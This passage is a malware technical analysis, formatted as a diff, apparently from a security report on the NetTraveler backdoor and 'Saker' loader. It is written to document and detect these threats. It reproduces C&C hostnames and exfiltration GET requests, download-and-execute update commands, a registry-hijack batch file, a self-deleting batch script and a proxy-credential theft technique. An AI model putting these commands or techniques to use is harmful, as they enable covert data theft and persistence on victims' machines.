@@ -1,0 +1,1257 @@
+~~Appendix A:~~ ~~Malware technical analysis~~
+The NetTraveler Dropper
+|MD5|2a43c23a17cd2bc9074a486c47444e7c|
+|---|---|
+|Create date (GMT)|2013.02.18 07:54:28|
+|Size|176’640|
+|Linker version|6.0 (MSVC++ 6.0)|
+Description
+The module is a Win32 PE executable file com
+piled in Microsoft Visual C++ 6.0. Its main pur
+pose is to drop a DLL file and register it as a sys
+tem service. The malware looks up a suitable
+service name from one of the values in the reg
+istry.
+This module also drops an INI-type file with the
+configuration that is later used by the NetTrav
+eler backdoor.
+Technical Details
+Execution of the module starts with the creation
+of a system mutex object called “INSTALL SER
+VICES NOW!”. If this mutex already exists the
+module quits to avoid duplicate instances of the
+same module from running.
+After that, the module creates the configura
+tion file named %WINDIR%\system\config_t.dat
+which is populated with the strings embedded in
+the body of the executable and encrypted with
+simple one-byte XOR (0x3E).
+Encrypted configuration data in the dropper
+26
+Appendix A: Malware technical analysis
+The config_t.dat is an INI-type file which contains
+the module configuration shown below:
+[Option]
+WebPage=hXXp://vip222idc.s169.288idc.com/nt12/
+newyork/city/nettraveler.asp2
+DownCmdTime=10
+UploadRate=128
+[Other]
+UP=0
+[OtherTwo]
+AutoCheck=1
+The WebPage parameter’s maximum length is
+128 bytes and represents a URL for the Com
+mand and Control server (C&C). DownCmdTime
+is the delay in minutes between requests sent
+to the C&C server.
+The code of the function to dump the INI file
+is designed to process several cases. There is
+1 byte value for variable UP (which stands for
+“Use Proxy”) from section [Other]. If that value
+is set to 1 (absolute file offset 0x334) then the
+INI file section [Other] will be populated with the
+following values:
+[Other]
+UP=1
+PS=
+PP=
+PU=
+PW=
+PF=<integer (2 bytes and non-negative from offset
+0x397)>
+The purpose of PS, PP, PU, PW, PF parameters
+is the following:
+
+
+PS = proxy server address
+
+
+PP = proxy server port
+
+
+PU = proxy username
+
+
+PW = proxy password
+
+
+PF parameter purpose remains unclear.
+
+
+The module then queries registry value at
+HKLM\SOFTWARE\Microsoft\Windows
+NT\CurrentVersion\Svchost\netsvcs which
+is a multi-string type of value. Then it iterates
+through the names of services in that value to
+find a special service name. It must not be the
+“6to4” service and there must not be registry
+key HKLM\SYSTEM\CurrentControlSet\Ser
+vices\.
+On Windows XP services that match the de
+scribed criterias are (eg.) “Ias”,”Iprip”, “Irmon”
+and a few others. These names are different on
+other Windows OS and even depend on installed
+features or Service Packs. The malware takes
+the first matching service name and uses it.
+Right after that, the malware attempts to delete
+%WINDIR%\system32\ex.
+dll and registers a new system service with the
+same name . The service is
+designed to be a Win32 shared process like
+svchost, autostarted by system service control
+manager during system boot. That creates cor
+responding system registry values in HKLM\
+SYSTEM\CurrentControlSet\Services\<ser
+vicename>.
+27
+After that it saves to local directory and executes
+the following batch file (net.bat):
+@echo off
+@reg add “HKEY_LOCAL_MACHINE\SYS
+TEM\CurrentControlSet\Services\Irmon\
+Parameters” /v ServiceDll /t REG_EXPAND_
+SZ /d C:\WINDOWS\system32\<servicen
+ame>ex.dll
+Note that  is replaced with the
+actual system service name that was previously
+found.
+After that the module creates the C:\WIN
+DOWS\system32\ex.dll file
+on disk and sets hard-coded file creation and
+last access date and time to “20:00 17 August
+2004”.
+The new file is then filled with data produced
+after decryption of the hard-coded data block.
+NetTraveler Backdoor
+(dropped file)
+|MD5|3c0ea91ea42f2bf6686e9735998e406e|
+|---|---|
+|Create date(GMT)|2013.02.18 02:33:49|
+|Size|204’800|
+|Linker version|6.0 (MSVC++ 6.0)|
+28
+The NetTraveler
+Description
+The malware is Win32 PE DLL file compiled in Mi
+crosoft Visual C++ 6.0. It has one export function
+ServiceMain which has the main functionality of
+the module.
+This module has initial filename assigned during
+compilation: “DLL.dll”.
+Technical Details
+Upon start the module sets corresponding ser
+vice status to “Start_Pending” and then imme
+diately to “Running”.
+It checks if system mutex named “NetTravler Is
+Running!” exists and terminates if that is true.
+Note: Other known mutexes used by variants of
+NetTraveler include:
+
+
+Boat-12 Is Running!
+
+
+DocHunter2012 Is Running!
+
+
+Hunter-2012 Is Running!
+
+
+NT-2012 Is Running!
+
+
+NetTravler Is Running!
+
+
+NetTravler2012 Is Running!
+
+
+SH-2011 Is Running!
+
+
+ShengHai Is Running!
+
+
+After that it opens %WINDIR%\system\con
+fig_t.dat file and parses the following values:
+Appendix A: Malware technical analysis
+Option]
+WebPage
+DownCmdTime
+UploadRate
+[OtherTwo]
+AutoCheck
+CheckedSuccess
+It creates a list of local paths in memory to work
+with later:
+
+
+%SYSDIR%\stat_t.ini
+
+
+%SYSDIR%\dnlist.ini
+
+
+%SYSDIR%\enumfs.ini
+
+
+%SYSDIR%\uenumfs.ini
+
+
+%SYSDIR%\udidx.ini
+
+
+%TEMP%\ntvba00.tmp\
+
+
+If CheckedSuccess value from INI file equals 0 or
+doesn’t exist, the module will fetch additional con
+figuration from the same INI file [Other] section:
+
+PS (string with no default value, max 64
+
+chars)
+
+
+PP (integer with default value: 80)
+
+
+PU (string with no default value, max 32
+
+
+chars)
+
+PW (string with no default value, max 32
+
+chars)
+
+PF (integer with default value: 10)
+
+Next the module prepares some strings for test
+ing the Internet connection:
+.log
+http://www.microsoft.com/info/privacy_se
+curity.htm (%TestURL%)
+Ironically, the %TestURL% is a Microsoft web
+page about privacy, security and safety online
+(last updated in January 2000):
+29
+After that with the help of WinInet API the mod
+ule issues an HTTP GET request to %TestURL%
+(see above) and the following hardcoded HTTP
+header values:
+Accept: image/gif, image/x-xbitmap, image/
+jpeg, image/pjpeg, application/x-shock
+wave-flash, /
+Accept-Language: en-us
+Proxy-Connection: Keep-Alive
+Pragma: no-cache
+User-Agent: Mozilla/4.0 (compatible; MSIE
+6.0)
+It sets other options such as proxy server ad
+dress and port (PS and PP values from INI file
+or attempts to find proxy settings automatical
+ly), proxy username and password (PU and PW
+values from the INI file), several connection
+timeouts limited with 60 seconds.
+The module submits the request and reads the
+response of the server. The response is stored
+in newly allocated memory block.
+After that the malware appends debug output
+to the log file named .log. The
+output messages are shown below:
+method currect:
+User: 
+ProxyIP::
+ProxyBypass::
+30
+The NetTraveler
+User: 
+Pass: 
+
+///////////////////////////////////////////////
+If the PS, PP, PU, PW parameters were not found
+the INI file or Autocheck value is set to 1, the
+module attempts to find local proxy settings ac
+cording to the procedure below.
+Finding Proxy
+Configuration
+First, the module lists contents of %PROGRAM
+FILES% directory and appends the listing to the
+log file.
+Then it opens IE history file of the current user
+(History.IE5\index.dat) parses it and appends
+the log with discovered logins/password saved
+in the the history file as a part of visited URLs.
+After that the module logs current version of
+Internet Explorer. Interestingly that the log file is
+appended with the following hard coded string:
+“IE版本: Internet Explorer “, 版本 means “ver
+sion” in Simplified Chinese.
+Appendix A: Malware technical analysis
+The module reads IE version from HKLM\Soft
+ware\Microsoft\Internet Explorer\Version reg
+istry value.
+Then it gets version of current OS, and again
+appends the result to the log file with some hard
+coded strings in it:
+“操作系统版本” which means “version of oper
+ating system” in Simplified Chinese.
+The malware is capable of interpretation of sys
+tem minor/major code and recognizing the fol
+lowing O Ses:
+
+
+Microsoft Windows 95
+
+
+Microsoft Windows 95 OSR
+
+
+Microsoft Windows 98
+
+
+Microsoft Windows 98 SE
+
+
+Microsoft Windows Millennium Edition
+
+
+Microsoft Windows NT
+
+
+Microsoft Windows 2000
+
+
+Microsoft Windows XP
+
+
+Microsoft Windows 2003
+
+
+Microsoft Windows Vista
+
+
+Microsoft Windows 7
+
+
+It can also recognize type of OS: Professional,
+Server, Advanced Server and exact version and
+build numbers are also appended to the log file.
+There were four different methods to find proxy
+configuration on the system according to the log
+file messages set in three functions. One of the
+function (method 2) was probably merged with
+another one (method 3) in newer variant of the
+malware.
+Method 1:
+This is a straightforward attempt to connect to
+the test url, assuming that system-wide proxy
+settings are correct or no proxy is required to
+access the external website. The URL for testing
+is http://www.microsoft.com/info/privacy_
+security.htm with the following header values:
+Accept: image/gif, image/x-xbitmap, image/
+jpeg, image/pjpeg, application/x-shock
+wave-flash, /
+Accept-Language: en-us
+Proxy-Connection: Keep-Alive
+Pragma: no-cache
+If the method succeeds the module appends
+received data from the URL to the log file and
+corresponding parameter is set in the INI file
+(UP=0).
+If something fails the following message is ap
+pended to the log file: “Method1 Fail!!!!!”
+Method 2 and Method 3:
+This method is used when the infected machine
+uses proxy server but the settings are not avail
+able for local SYSTEM user. A user working at
+31
+the infected machine might have internet ac
+cess and should have the required proxy server
+settings.
+The malware list all processes running on the
+machine and locates process named “EXPLOR
+ER.EXE”. This process is a system shell which is
+normally running after local user successfully
+authenticates and logs in to the system. The
+malware finds explorer process and obtains se
+curity token which is later used to temporarily
+impersonate as local user and get proxy con
+figuration with InternetQueryOptionA(0,INTER
+NET_OPTION_PROXY,...) API call.
+If the result contains proxy settings the malware
+gets them. If for some reason local proxy set
+tings were not found in current user profile, the
+malware attempts to double-check and opens
+IE settings in the registry. The following registry
+values are checked:
+HKCU\Software\Microsoft\Windows\Cur
+rentVersion\Internet Settings\ProxyEnable
+HKCU\Software\Microsoft\Windows\Cur
+rentVersion\Internet Settings\ProxyServer
+HKCU\Software\Microsoft\Windows\Cur
+rentVersion\Internet Settings\ProxyOver
+ride
+After that the malware first obtains the IE stored
+credentials. It iterates through all stored local
+32
+The NetTraveler
+user secrets via CredEnumerateA and looks for
+those which start with “Microsoft_WinInet_” and
+contain the address of the proxy server previ
+ously obtained. These secrets are decrypted
+with CryptUnprotectData API call. Such call is
+possible only after impersonation as local user
+which is available for the malware running with
+local system privileges. This method checks the
+first available password in the list of passwords
+from the system stored secrets.
+Once the potential server, port, login and pass
+word are obtained the malware makes a test
+query to the same URL: http://www.microsoft.
+com/info/privacy_security.htm. If it succeeds
+the content of this page is appended to the log
+file with all details about the proxy server. If the
+method fails it prints the following line in the log
+file: “Method3 Fail!!!!!”
+Method 4:
+This method is identical to Method 3 with just
+one difference: it checks the last available pass
+word in the list of passwords from the system
+stored secrets.
+Method X (debug):
+There is also an unused method in the code with
+no internal number, which was most likely used
+to debug the application as it writes all interme
+diate results to the log file, starting from string
+Appendix A: Malware technical analysis
+“Get From IEOption!” or “Get From Reg!” de
+pending on the path of code execution.
+If the malware failed to locate the proxy server it
+unregisters current malicious service by deleting
+corresponding registry keys in HKLM\System\
+CurrentControlSet\\ and at
+tempts to delete all related files from the fol
+lowing list:
+
+
+C:\Windows\System32\enumfs.ini
+
+
+C:\Windows\System32\uenumfs.ini
+
+
+C:\Windows\System32\udidx.ini
+
+
+C:\Windows\System32\dnlist.ini
+
+
+C:\Windows\System32\stat_t.ini
+
+
+Otherwise, if the proxy was checked successful
+ly the malware writes the following value to the
+config file (config_t.dat):
+[OtherTwo]
+CheckedSuccess=1
+After that the module sleeps for 60 seconds and
+starts a new thread (see below Thread1), sleeps
+10 more seconds and creates another thread
+(see below Thread2). Right after that it enters an
+infinite loop of doing nothing but sleeping which
+can be interrupted by a special value in global
+variable set by other threads. Upon detecting
+this value the service routine ends which termi
+nates the service execution.
+Thread1 (Command and Control
+Thread)
+This thread starts from collecting local system
+information, including the following:
+
+
+Local computer name
+
+
+Local IP address
+
+
+Local user name
+
+
+OS version, build and product type
+
+
+List of local disk drives with available
+
+
+space on them
+
+CPU characteristics including vendor
+
+identifier and frequency
+
+
+RAM status
+
+
+Current process lists
+
+
+Output of the “ipconfig /all” system
+
+
+command
+This information is stored in a text buffer with
+Chinese comments like shown below (transla
+tion is added in red):
+[计算机信息] Computer Information
+计算机:  Computer
+用户名:  User name
+Ip地址:  Address
+操作系统:   (<Build Num
+ber>) Operating System
+磁盘空间: 总磁盘空间为:***GB,剩余磁盘空间
+为GB(占*.%)
+Disk Space: Total disk space ***GB, the remain
+ing disk space GB (*.%)
+CPU:  MHZ
+物理内存: 总物理内存:MB,可用内存:MB (
+占.%)
+33
+Physical Memory: Total physical memory: ***MB
+of available memory: MB (*.%)
+[进程列表] Process List
+0 [System Process]
+4 System
+892 smss.exe
+948 csrss.exe
+972 winlogon.exe
+1016 services.exe
+1028 lsass.exe
+…
+C&C Communication
+This information is saved in %WINDIR%\Sys
+tem32\system_t.dll text file. This file is read
+a moment later, compressed using a custom
+Lempel-Ziv-based algorithm, encoded with a
+modified Base64 encoding and uploaded to the
+C&C server using HTTP GET request of the fol
+lowing format:
+GET /nt12/newyork/city/nettraveler.asp?host
+id=&hostname=<Host
+name>&hostip=&filename=travlerback
+info-.dll&filestart=0&file
+text=begin::<modified Base64 and LZ-compressed
+data>::end
+Accept: image/gif, image/x-xbitmap, image/jpeg,
+image/pjpeg, application/x-shockwave-flash, /
+Accept-Language: en-us
+Pragma: no-cache
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win
+dows NT 5.0)
+34
+The NetTraveler
+Host: vip222idc.s169.288idc.com
+Connection: Keep-Alive
+If the file upload is successful, the module de
+letes the “system_t.dll” file. Please note that
+the serial number of current disk drive (most
+likely it is drive “C”) is used in HTTP query value
+hostid. This identifier derived from the local
+filesystem is used later as a reliable identifier of
+current infected machine or simply BotId.
+The Control Loop
+After that it enters control loop. Every 10 minutes
+according to the DownCmdTime parameter val
+ue in the config file, it sends HTTP GET request
+of the following format:
+GET /nt12/newyork/city/nettraveler.asp?ac
+tion=getcmd&hostid=&host
+name=
+…
+If the server response starts with “[CmdBegin]”
+and ends with “[CmdEnd]” then the response
+is saved in C:\Windows\System32\stat_t.
+ini file. After that the code confirms receiving
+the command by submitting another HTTP GET
+request in the format below:
+GET /nt12/newyork/city/nettraveler.asp?action=
+gotcmd&hostid=&hostname
+=
+…
+Appendix A: Malware technical analysis
+The module expects server to reply “Success”. If
+it doesn’t the module will try again in 10 minutes.
+If the server was notified and confirmed receiv
+ing the notification, the module reads stat_t.
+ini file which is just another config in INI format:
+[Download]
+dircount=
+filecount=
+f1=
+f2=
+f3=
+…
+d1=
+d2=
+d3=
+…
+[Scan]
+dircount=
+filecount=
+All values f from stat_t.ini file are read and
+saved in %WINDIR%\System32\dnlist.ini file:
+[Filelist]
+f1=
+f2=
+f3=
+…
+All values d from stat_t.ini file are read
+and the corresponding local directory and sub
+directories listings are collected and appended
+to the dnlist.ini file in the format:
+[Filelist]
+f1=
+f2=
+f3=
+…
+The following values from stat_t.ini file are also
+transferred to the dnlist.ini file:
+|Sectionin stat_t.ini|Valuein stat_t.ini|Default|Sectionin dnlist.ini|Valuein dnlist.ini|
+|---|---|---|---|---|
+|[Scan]|dircount||[ScanList]|dircount|
+|[Scan]|ScanAll|False|[ScanList]|ScanAll|
+|[Other]|TypeLimit|True|[Other]|TypeLimit|
+|[Other]|USearch|True|[Other]|USearch|
+|[Other]|GSearch|True|[Other]|GSearch|
+|[Other]|UTypeLimit|True|[Other]|UTypeLimit|
+|[Other]|UAuto|False|[Other]|UAuto|
+|[Other]|Types|doc, docx, xls,xlsx, txt, rtf, pdf|[Other]|Types|
+35
+The NetTraveler
+|[Other]|UP|False|[Other]|0 or 1|
+|---|---|---|---|---|
+|[Other]|PS||[Other]|PS|
+|[Other]|PP|80|[Other]|PP|
+|[Other]|PU||[Other]|PU|
+|[Other]|PW||[Other]|PW|
+|[Other]|PF|10|[Other]|PF|
+This is clearly the functionality which lets the
+attacker download specific files or even full di
+rectories including all subdirectories contents
+basing on defined file search criterias, such as
+file extensions.
+Filesystem Scan
+The malware has a file enumeration routine,
+which gets the settings from dnlist.ini (such as
+directory paths to process) and launches a re
+cursive directory search. The output is saved to
+enumfs.ini file in the following format:
+[Computer]
+Name=
+Page=
+[]
+d1=
+d2=
+…
+d=
+dircount=
+[]
+f1=
+f2=
+…
+36
+f=
+d1=
+d2=
+…
+d=
+dircount=
+filecount=
+[]
+…
+After execution, this log file contains directories
+                            with all filenames and subdirectories. Only di
+
+rectory/file names are stored, with no addition
+al data such as timestamps or size. When the
+search is finished, the module saves current
+date to the dnlist.ini file and changes option
+ScanAll, see format below. This is done to avoid
+recurrent scanning of the filesystem, which is
+normally a heavy process and might be noticed
+by local user or an administrator.
+[EnumTime]
+DateTime=
+[ScanList]
+ScanAll=False
+Appendix A: Malware technical analysis
+After scanning the local filesystem, enumfs.
+ini file is uploaded to the server via HTTP GET
+request described above (see the submission
+process of stat_t.ini file in the beginning of C&C
+Communication part) with filename of the fol
+lowing format:
+FileList--
+.ini
+Uploading Files
+The next stage of this thread uploads files inter
+esting for the attacker to the C&C server. This
+process is described below.
+The module works with files described in dnlist.
+ini file. It gets a list of file extensions that must
+be uploaded to the C&C first. There is a default
+list of extensions (value Types of section [Oth
+er]) that represent interest for the attackers:
+doc,docx,xls,xlsx,txt,rtf,pdf. Then it gets file
+total values from [FileList] section of dnlist.ini
+and iterates through every f value, where N
+is a positive integer starting from 1.
+There are several tests applied to each file, be
+fore it is uploaded to the server, including the
+following:
+
+File size must not be larger than ~10Mb
+
+(10’485’760 bytes).
+
+File must have one of the extensions from
+
+the “Types” option.
+If the file matches the criterias, then a unique
+file state identifier for that file is created,
+which is an MD5 hash of the following string:
+“ --
+:::<Millisec
+onds>”. The date and time values in the string
+before are obtained from the file last change
+time.
+After that the module creates a name used for
+uploading the file to the server, which consists
+of the following: “--
+--<File state identifier, the
+MD5>”. The time and date values are also taken
+from the file’s last change time. This file is up
+loaded to the C&C using the same procedure as
+used before for uploading other files.
+After that, Thread1 attempts to upload a file called
+uenumfs.ini, which is created by the Thread2. The
+remote filename is set to the following “UFileL
+ist--<Sec
+ond>.ini”.
+Next, the thread iterates through %TEMP%\
+ntvba00.tmp\ directory and uploads every file
+located there. The file names are preserved as
+they are.
+Control Procedure
+Then, the thread issues a special HTTP GET re
+quest to get next control instruction from the
+C&C. This is done by accessing the following URI:
+37
+hXXp://vip222idc.s169.288idc.com/nt12/newyork/
+city/nettraveler.asp?action=getdata (3)
+Server response is converted to uppercase and
+analyzed. There is defined set of responses ex
+pected from the C&C server:
+
+:UNINSTALL
+
+This command simply uninstalls the malicious
+service from the registry and deletes locally cre
+ated files.
+
+:UPDATE
+
+This procedure starts from uninstalling current
+service, then it issues three HTTP GET requests
+to the C&C script URL:
+GET .../newyork/city/nettraveler.asp?action=data-
+size to get the size of updated module that will
+be pushed with next request.
+GET .../newyork/city/../updata.exe to get the up
+dated module to be executed. This module is
+instantly saved to %WINDIR%\install.exe and
+executed.
+
+:RESET
+
+This procedure simply removes all temporary
+files, such as the following:
+38
+The NetTraveler
+
+
+%SYSDIR%\enumfs.ini
+
+
+%SYSDIR%\dnlist.ini
+
+
+%SYSDIR%\udidx.ini
+
+
+%SYSDIR%\uenumfs.ini
+
+
+%SYSDIR%\stat_t.ini
+
+
+:UPLOAD
+
+
+This procedure is identical to the UPDATE com
+mand described before with one difference - no
+uninstallation of the current module is done, only
+new executable is downloaded and started. This
+method is probably used to execute additional
+independent malicious executable, unrelated
+to the original NetTraveler malware. Or it can
+be used to infect with the NetTraveler backdoor
+configured for some other C&C server.
+After processing any of the commands above
+the malware issues the following request to the
+server to confirm command execution:
+GET .../newyork/city/nettraveler.asp?action=updat-
+ed&hostid=
+If the server hasn’t issued the UNINSTALL com
+mand the thread continues execution starting
+from the beginning of The Control Loop (see
+above).
+Appendix A: Malware technical analysis
+Thread2 (Drive Monitoring Thread)
+This thread creates a hidden window with class
+name “NTMainWndClass” and processes win
+dow messages in a loop until it is interrupted by
+special variable value. The window procedure
+processes only one window message, WM_DE
+VICECHANGE with wParam value set to DBT_
+DEVICEARRIVAL, which is sent by the system
+when a new removable device such as USB flash
+drive or Network shared folder is attached to
+the system.
+The module will proceed only if the attached
+removable device has provided a disk volume.
+It is designed to have different procedures for
+removable disk drives from USB flash and net
+work shares.
+The USB drives will be processed only if GSearch
+value is set to True in [Other] section of dnlist.
+ini file. Similarly, a new network drive will be
+processed only if USearch value is set to True
+in [Other] section of dnlist.ini file.
+Both network and removable USB drives are
+processed in the same procedure, which reads
+the following values from dnlist.ini file:
+[Other]
+UTypeLimit=
+UAuto=
+If UAuto option is set to True, the thread creates
+%TEMP%\ntvba00.tmp\ directory and opens
+uenumfs.ini file for writing. The latter is filled
+with directories and subdirectories listings of the
+attached disk drive. The format of the data in
+uenumfs.ini is almost identical to the one created
+during fixed drive filesystem scan (see “Filesys
+tem Scan” part in Thread1 description above).
+In addition to that, the same criterias are applied
+to each file (size and file extension) as in fixed
+drive filesystem scan. Also, every file gets a state
+id calculated as MD5 hash of the filename and
+timestamp of the last modification. This hash
+is used to generate a new filepath in the follow
+ing format: %TEMP%\ntvba00.tmp\
+----<File
+state id, MD5 hexadecimal string>.<Original
+extension>. The source file from newly attached
+drive is then copied to the destination set by the
+generated file path. Please note, that the file orig
+inal extension is preserved, while the file name is
+changed. That is used to prevent further problems
+when working with unsupported encoding.
+At the same time when file is copied to ntvba00.
+tmp directory, a record is added to udxidx.ini
+file, which has the following format:
+[Index]
+=1
+This is done to avoid copying files that were al
+ready copied before, unless they were changed
+by the user.
+39
+To avoid excessive use of the disk drive and oc
+casional interest of the local user, the file copy
+ing procedure has a delay. Every 1000 files the
+thread delays execution and sleeps for 9 sec
+onds.
+Side notes
+Useless text transformation
+In function which gets disk volume serial num
+ber the actual serial number is converted from a
+decimal integer to a hexadecimal number stored
+as an ASCII string. The integer is converted to
+40
+The NetTraveler
+a string with call to the “sprintf’ function and
+“%8X” parameter which outputs 8 characters
+representing a number in hexadecimal form.
+Despite the fact that the output of this call is in
+uppercase, the author of the module converts
+the output to uppercase characters again. This
+could be due to the fact that the author used to
+have “%8x” format string before, which made
+such conversion rational. However, that clearly
+shows that the developer wasn’t aware of vari
+ous format strings options, which shows lack of
+experience in C/C++ development.
+Appendix A: Malware technical analysis
+Drive monitoring disk processing issue
+As we mentioned above the drive monitoring
+thread uses the same function to process
+removable USB drives and network shares
+attached as local drives. Visible separation of
+these two types of disk drives (in the name of
+the options GSearch and USearch, where “U”
+probably stands for “USB” and “G” is for “Glob
+al”, and in separate logical branches of code
+flow) is later misused, as the drive processing
+routines is bound to USB drives. At least it read
+U-prefixed options from dnlist.ini file, which
+logically corresponds to the USB-type of disk
+drive, but used for both. While this is a minor
+issue and probably didn’t cause a serious
+problem for the attackers, this shows that the
+developer felt lazy at some point and used
+Copy and Paste approach to avoid creating
+extra code. It could also mean that one part of
+the code was created by one person and later
+modified by another, who mistakenly over
+looked general code design.
+Data decompression routine
+The malware uses a custom data compres
+sion algorithm when uploading files to the
+C&C server. While the decompression is not
+required for the work of the application, the
+code for the decompression routine was also
+found in the malicious module. This clearly
+indicates a design flaw and shows that the de
+veloper didn’t review the code on a binary level
+after it was compiled, which is common among
+beginners among malware authors and quite
+widespread among common software develop
+ers. ‘Saker’ (‘Xbox’) Dropper and Loader
+‘Saker’ (‘Xbox’) Dropper
+and Loader
+|MD5|c239af6aff1226fa2b2bb77dfec865ce|
+|---|---|
+|Create date (GMT)|2013.03.13 12:39:21|
+|Size|67’072|
+|VulnerabilityTargeted|6.0 (MSVC++ 6.0)|
+Description
+The module is non-packed Win32 PE executable
+file compiled in Microsoft Visual C++ 6.0. Al
+though no encryption or compression is used to
+protect or hide parts of the code, simple obfus
+cation is applied to internal strings. The module
+main purpose is to install and embedded DLL file
+or load it during system startup.
+Technical Details
+Execution of the main function starts with ob
+taining local user Startup directory. This path is
+appended with “\service.lnk”.
+41
+The strings, which are used in the application are
+stored in simple obfuscated form. For example,
+the “Kaspersky Lab” is stored as “K.sp4r6ky
+aa,”. The 1, 4, 6, 10 and 12 characters are re
+placed with hardcoded character constants as
+shown below:
+Then the module gets local %TEMP% folder path
+and constructs paths “%TEMP%\service.dll”
+and “%TEMP%\service.exe”.
+After that the code checks if the current module
+file name is called “service.exe”.
+If current module is not called “service.exe”,
+the module copies itself to “%TMP%\service.
+exe” and creates corresponding LNK file in lo
+cal user’s startup folder pointing to the freshly
+created executable. The executable file is as
+signed an attribute “hidden” and started in a
+new process. Then the module checks if Kasper
+sky products are installed on local system by
+42
+The NetTraveler
+iterating through %PROGRAMFILES% directory
+and looking for “Kaspersky Lab” subdirectory. If
+it finds Kaspersky products it quickly exits, if not
+it attempts to self-delete by running “cmd.exe /c
+del ” and then exits.
+If the module was already installed in the system
+and is called “service.exe”, it checks if system mu
+tex object called “SECUT!” already exists and exits
+if it’s true. This is done to avoid multiple instances
+of the module from running simultaneously.
+After that, the module creates a new file at
+“%TEMP%\service.dll” and saves a part of own
+data to the new file. The data offset is hardcoded
+as a string “46592”.
+Next, it attempts to load the “%TEMP%\service.
+dll” library file and call export function named
+“JustTempFun”. After that the module enters
+an infinite sleep loop.
+Appendix A: Malware technical analysis
+‘Saker’ (‘Xbox’) Backdoor
+(dropped file)
+|MD5|6312bc2b156062ba5358e7099a88bb95|
+|---|---|
+|Create date (GMT)|2013.03.13 12:35:11|
+|Size|46’592|
+|VulnerabilityTargeted|6.0 (MSVC++ 6.0)|
+Description
+The module is a non-packed Win32 DLL exe
+cutable file compiled in Microsoft Visual C++
+6.0. Although no encryption or compression is
+used to protect or hide parts of the code, simple
+obfuscation is applied to internal strings. The
+module is to clearly a backdoor application that
+enables an attacker to manage files, get infor
+mation about local disk drives, download and
+start new executables. This backdoor is probably
+authored by the same developer who created the
+Gh0st / Zegost RAT.
+Technical Details
+This module has 2 export functions: JustTemp
+Fun and ServiceMain. Module main function as
+well as ServiceMain are empty procedures. So
+far, all functionality of the module is located in
+JustTempFun function.
+Meanwhile, there is another known malicious
+DLL which has exactly these export names 
+Gh0st RAT, that was also developed by Chinese.
+When this module is loaded with Xbox Loader
+described above execution is started with Just
+TempFun exported function. This function begins
+with deobfuscation of the strings used further:
+pitgay.minidns.net
+8090BBBBBBBBBBBB
+GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
+SakerEvent
+FFFFFFFFFFFFFFFF
+Proxy
+HHHHHHHHHHHHHHHH
+Obviously pitgay.minidns.net is the C&C server
+domain name. 8090 is the port the malware con
+nects to. As for the “GGG...”, “FFF...” and “HHH...”
+strings, according to the further code analysis
+they are used as a placeholders for the hardcode
+proxy settings:
+The “FFF...” placeholder may contain “Proxy”
+string instead of “F” sequence which works as a
+flag to use the proxy settings from the “GGG...”
+placeholder in the form that wininet accepts
+(according to MSDN, the format is “http=http://
+http_proxy other”). The “HHH...” placeholder is
+for proxy username and password.
+The thread collects information about the local
+system, such as
+
+
+OS version
+
+
+CPU type
+
+
+43
+
+
+Used and available memory
+
+
+Local system name
+
+
+Used and available disk space of the
+
+
+drive C:\
+The last value is converted to a hexstring of 8
+characters and XOR-ed with current computer
+name. The purpose of this value is unclear.
+Then the information collected before is encrypt
+ed using simple string obfuscation algorithm,
+shown below in a pseudo code:
+void ObfuscateString(char strIn, char strOut, int
+nLen)
+{
+char c;
+for (i=0;i <nLen; i++)
+{
+c = strIn[i] % 32;
+if(c <= 9)
+strOut[2*i] = c+0x30;
+else
+strOut[2*i] = c+0x37;
+if(strIn[i] <= 9)
+strOut[2*i+1] = strIn[i]+0x30;
+else
+strOut[2*i+1] = strIn[i]+0x37;
+}
+}
+44
+The NetTraveler
+This algorithm not only adds obfuscation but
+also adds some redundancy, which doubles the
+size of the input string.
+The module attempts to connect to a C&C server
+and issue using the following URL:
+http:/ /pitgay.minidns.net:8090/3010...
+Also, it uses a hardcoded User-Agent string.
+There is not query string parameters, the data
+is transferred in a form of CGI path consisting of
+hex numbers only and prefixed with 3010, which
+makes such requests rather unique. 3010 most
+likely defines client request ID. Here is how a
+request may look:
+GET /301000000000F0FD...0000000000000000000
+000000 HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win-
+dows NT 5.0; .NET CLR 1.1.4322)
+Host: tsgoogoo.net
+Host: pitgay.minidns.net:8090
+Cache-Control: no-cache
+The module checks the server response code
+and if that is HTTP 200, it reads 2 DWORD values
+(lets call them ParamA and ParamB) from the the
+server response.
+The first DWORD (ParamA) defines the command
+and following execution path. Below is the inte
+ger values and commands description:
+Appendix A: Malware technical analysis
+1020: Shutdown
+1021: Shutdown
+Both 1020 and 1021 commands are used to
+interrupt execution of the module and terminate
+the main thread. The module also sets local
+thread privileges to enable global system shut
+down, however this is not used later and proba
+bly represents some remains of the code written
+earlier or another variant of the code. This is also
+confirmed by by the shutdown procedure exe
+cuted afterwards, which is designed to disable
+Windows hook mechanism while it wasn’t used
+previously anywhere in the code.
+1022: Self-remove
+This command is used to self-remove current
+module and stop its execution. It attempts to
+create a local batch file named del.bat with the
+following contents and run it:
+@echo off
+ping /n 5 127.0.0.1 >nul
+>nul del /f/s/q/a \service.exe
+>nul del /f/s/q/a \service.dll
+>nul del %0 /s/q/a/f del.bat
+Please note non-standard way to call Windows
+command line interpreter which starts from re
+direction of output to NUL virtual device. Also,
+the command arguments are not separated with
+space or tab characters, and it might look invalid,
+however cmd.exe on Windows XP, Windows 7 and
+Windows 8 executed it correctly without a problem.
+1029: File manager
+The command spawns a new thread which
+opens a new session with the server to provide
+file management operations.
+The new thread makes 2 HTTP Get requests
+to the server, which are identical to the 3010
+request described above. The only difference
+is the request ID, which is 4001 and 4002 for
+the first and second requests correspondingly.
+The output of the 4001 request is ignored, while
+request 4002 is interpreted.
+The server response contains 2 DWORD values:
+lets call them FileCmdId and DataSize. if Data
+Size is non-zero the module fetches additional
+data which length is specified in the DataSize
+option.
+The FileCmdId defines which operation must be
+executed. It can be one of the following values:
+5001: Get drive information. Provides informa
+tion about specified disk drive: free space, drive
+type. Client command success code is 0, error
+code is 7004.
+5002: Get file information. Provides information
+about specified file: file times, attributes. Client
+command success code is 0, error code is 7003.
+5003: Get directory information. Provides
+information about specified directory: directory
+45
+times, attributes, full size. Client command suc
+cess code is 0, error code is 7003.
+5004: Get directory listing. Provide simple di
+rectory listing, which includes file names, sizes,
+last write time. Client command success code is
+0, error code is 7001.
+5006: Create directory. Create a new directory,
+which full path is provided by the server. Client
+command success code is 0, error code is 7016.
+5008: List drives. List available disk drives with
